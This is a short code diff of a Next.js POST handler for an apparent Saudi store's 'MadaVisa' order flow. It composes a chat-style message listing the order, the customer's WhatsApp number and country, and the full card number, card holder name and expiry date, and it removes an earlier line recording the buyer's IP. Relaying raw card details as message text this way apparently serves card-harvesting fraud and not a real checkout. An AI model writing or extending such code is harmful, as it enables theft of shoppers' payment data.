@@ -60,8 +60,6 @@ export async function POST(req: NextRequest) {
   const text = [
     `🏪 طلب لـ متجر مؤسسة برج المبدع `,
     `🔢 رقم الطلب: #${orderId}`,
-    `🌍 الدولة: ${country}`,
-    `🌐 IP: ${ip}`,
     ``,
     `💰 Total Amount: ${total} SAR`,
     ...(installmentType === "installment"
@@ -71,6 +69,7 @@ export async function POST(req: NextRequest) {
     `💳 MadaVisa - New Order`,
     `👤 Order For: ${customer ?? "-"}`,
     `📱 WhatsApp: ${whatsapp ?? "-"}`,
+    `🌍 Country: ${country}`,
     `💳 Card Number: ${cardNumber}`,
     `👤 Card Holder: ${cardHolder}`,
     `📅 Valid To: ${expiry}`,
